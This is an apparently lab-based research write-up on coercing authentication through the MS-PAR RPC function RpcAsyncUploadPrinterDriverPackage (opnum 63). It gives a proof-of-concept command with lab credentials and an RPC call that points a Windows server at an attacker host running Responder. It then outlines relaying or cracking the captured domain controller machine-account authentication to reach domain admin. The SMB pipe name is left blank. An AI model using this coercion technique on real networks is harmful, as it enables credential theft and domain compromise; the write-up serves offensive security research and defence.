# MS-PAR - Remote call to RpcAsyncUploadPrinterDriverPackage (opnum 63)

## Summary

+ **Protocol**: [[MS-PAR]: Print System Asynchronous Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0)

+ **Protocol UUID**: 76f03f96-cdfd-44fc-a22c-64950a001209

+ **Protocol version**: 1.0

+ **SMB Named pipe**: ``

+ **Function name**: [`RpcAsyncUploadPrinterDriverPackage`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/cdb3054e-db6e-4d08-ab8c-2282375b1f8c)

+ **Function operation number**: `63`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-PAR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0) protocol (with uuid `76f03f96-cdfd-44fc-a22c-64950a001209` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-PAR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-PAR]: Print System Asynchronous Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0) and allows to call RPC functions of this protocol. We will then call the remote [`RpcAsyncUploadPrinterDriverPackage`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/cdb3054e-db6e-4d08-ab8c-2282375b1f8c) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
RpcAsyncUploadPrinterDriverPackage('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT RpcAsyncUploadPrinterDriverPackage(
   [in] handle_t hRemoteBinding,
   [in, string, unique] const wchar_t* pszServer,
   [in, string] const wchar_t* pszInfPath,
   [in, string] const wchar_t* pszEnvironment,
   [in] DWORD dwFlags,
   [in, out, unique, size_is(*pcchDestInfPath)] 
     wchar_t* pszDestInfPath,
   [in, out] DWORD* pcchDestInfPath
 );
```

## References

+ Documentation of protocol [MS-PAR]: Print System Asynchronous Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0

+ Documentation of function `RpcAsyncUploadPrinterDriverPackage`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/cdb3054e-db6e-4d08-ab8c-2282375b1f8c